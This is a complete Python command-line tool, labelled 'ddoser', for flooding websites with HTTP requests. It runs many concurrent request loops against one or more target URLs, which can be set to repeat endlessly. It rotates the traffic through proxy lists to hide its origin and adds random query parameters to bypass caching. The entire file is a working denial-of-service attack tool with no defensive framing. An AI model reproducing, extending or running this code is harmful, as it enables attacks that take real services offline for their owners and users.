#!/usr/bin/env python
import asyncio
import logging
import os
import sys
from collections import defaultdict
from itertools import cycle
from random import randint
from typing import Iterable, List, Tuple
import urllib.parse as urlparse
from urllib.parse import urlencode


import aiohttp
import click
import requests as requests
from aiohttp_socks import ProxyConnector

STATS = defaultdict(int)


def config_logger(verbose, log_to_stdout):
    kwargs = {}
    if not log_to_stdout:
        kwargs['filename'] = os.path.abspath(sys.argv[0]).split('.')[0] + '.log'
    logging.basicConfig(
        level=logging.DEBUG if verbose else logging.INFO,
        format="[%(asctime)s] %(levelname)s:  %(message)s",
        datefmt="%d-%m-%Y %I:%M:%S",
        **kwargs
    )


async def make_request(url: str, proxy: str, timeout: int, user_agent: str):
    timeout = aiohttp.ClientTimeout(total=timeout)
    logging.debug('Url: %s Proxy: %s', url, proxy)
    try:
        if proxy:
            connector = ProxyConnector.from_url(proxy)
            client_session = aiohttp.ClientSession(connector=connector, timeout=timeout)
        else:
            client_session = aiohttp.ClientSession(timeout=timeout)
        if user_agent:
            client_session.headers['user-agent'] = user_agent

        async with client_session as session:
            async with session.get(url) as response:
                await response.text()
                logging.info('Url: %s Proxy: %s Status: %s', url, proxy, response.status)
    except Exception as error:
        logging.warning('Url: %s Proxy: %s Error: %s', url, proxy, error)
        STATS[f'{type(error)}'] += 1
    else:
        STATS['success'] += 1


def get_proxy(proxy_iterator: Iterable[str]) -> str:
    try:
        type_, ip, port = next(proxy_iterator)
        return f'{type_}://{ip}:{port}'
    except StopIteration:
        return None


def prepare_url(url: str, with_random_get_param: bool):
    if with_random_get_param:
        url_parts = list(urlparse.urlparse(url))
        query = dict(urlparse.parse_qsl(url_parts[4]))
        query.update({f'param_{randint(0, 1000)}': str(randint(0, 100000))})
        url_parts[4] = urlencode(query)
        return urlparse.urlunparse(url_parts)
    return url


async def ddos(
        target_url: str, timeout: int, count: int, proxy_iterator: Iterable[Tuple[str, str, int]],
        with_random_get_param: bool, user_agent: str
):
    step = 0
    while True:
        if count and step > count:
            break
        step += 1
        proxy = get_proxy(proxy_iterator)
        await make_request(prepare_url(target_url, with_random_get_param), proxy, timeout, user_agent)


async def amain(
        target_urls: List[str], timeout: int, concurrency: int, count: int, proxies: List[Tuple[str, str, int]],
        with_random_get_param: bool, user_agent: str
):
    coroutines = []
    proxy_iterator = cycle(proxies or [])
    for target_url in target_urls:
        for _ in range(concurrency):
            coroutines.append(ddos(target_url, timeout, count, proxy_iterator, with_random_get_param, user_agent))
    await asyncio.gather(*coroutines)


@click.command(help="Run ddoser")
@click.option('--target-url', help='ddos target url')
@click.option('--target-urls-file', help='path to file contains urls to ddos')
@click.option('--proxy-url', help='url to proxy resourse')
@click.option('--proxy-file', help='path to file with proxy list')
@click.option('--concurrency', help='concurrency level', type=int, default=1)
@click.option('--count', help='requests count (0 for infinite)', type=int, default=1)
@click.option('--timeout', help='requests timeout', type=int, default=5)
@click.option('--verbose', help='Show verbose log', is_flag=True, default=False)
@click.option('--with-random-get-param', help='add random get argument to prevent cache usage', is_flag=True, default=False)
@click.option('--user-agent', help='custom user agent')
@click.option('--log-to-stdout', help='log to console', is_flag=True)
def main(
        target_url: str, target_urls_file: str, proxy_url: str, proxy_file: str,
        concurrency: int, count: int, timeout: int, verbose: bool, with_random_get_param: bool,
        user_agent: str, log_to_stdout: str
):
    config_logger(verbose, log_to_stdout)
    if not target_urls_file and not target_url:
        raise SystemExit('--target-url or --target-urls-file is required')
    proxies = load_proxies(proxy_file, proxy_url)
    target_urls = []
    if target_urls_file:
        with open(target_urls_file) as f:
            target_urls.extend(line.strip() for line in f)
    if target_url:
        target_urls.append(target_url)
    loop = asyncio.get_event_loop()
    loop.run_until_complete(amain(target_urls, timeout, concurrency, count, proxies, with_random_get_param, user_agent))
    for key, value in STATS.items():
        if key != 'success':
            logging.info("%s: %s", key, value)
    logging.info('success: %s', STATS["success"])


def load_proxies(proxy_file: str, proxy_url: str) -> List[Tuple[str, str, int]]:
    if proxy_url:
        logging.info('Loading proxy list from %s..', proxy_url)
        proxy_data = requests.get(proxy_url).text
    elif proxy_file:
        logging.info('Loading proxy list from %s..', proxy_file)
        proxy_data = open(proxy_file).read()
    else:
        proxy_data = None
    if proxy_data:
        proxies = []
        for line in proxy_data.split():
            type_ = line.split('#')[-1]
            ip = line.split(':')[0]
            port = int(line.split(':')[-1].split('#')[0])
            proxies.append((type_, ip, port))
        logging.info('Loaded %s proxies', len(proxies))
        return proxies
    return None


if __name__ == '__main__':
    main()
